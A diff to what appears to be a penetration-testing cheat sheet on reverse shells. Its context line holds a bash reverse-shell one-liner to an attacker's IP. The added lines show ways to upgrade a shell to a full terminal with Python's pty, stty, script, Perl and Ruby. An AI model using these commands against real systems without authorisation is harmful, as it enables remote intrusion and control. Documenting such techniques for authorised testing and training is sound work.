@@ -22,10 +22,65 @@ bash -c "bash -i >& /dev/tcp/{YOUR_IP}/443 0>&1"
 
 ### Make fully interactive
 
+**Method 1**
+
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 CTRL-Z
 stty raw -echo
 fg
 export TERM=xterm
+```
+
+**Method 2**
+
+```bash
+# Step 1: Spawn PTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Step 2: Background shell
+# Press: Ctrl+Z
+
+# Step 3: In your local terminal
+stty raw -echo; fg
+
+# Step 4: Back in reverse shell
+export TERM=xterm
+export SHELL=/bin/bash
+stty rows 24 columns 80
+```
+
+## Troubleshooting
+
+Dealing with error
+
+su must be run in a terminal
+foo must be run in a terminal
+not an interactive terminal
+not an interactive session
+
+### Quick Fixes
+
+**Method 1: Python PTY (Most Common)**
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+**Method 2: Script Command**
+
+```bash
+script /dev/null
+```
+
+**Method 3: Perl**
+
+```bash
+perl -e 'exec "/bin/bash";'
+```
+
+**Method 4: Ruby**
+
+```bash
+ruby -e 'exec "/bin/bash"'
 ```
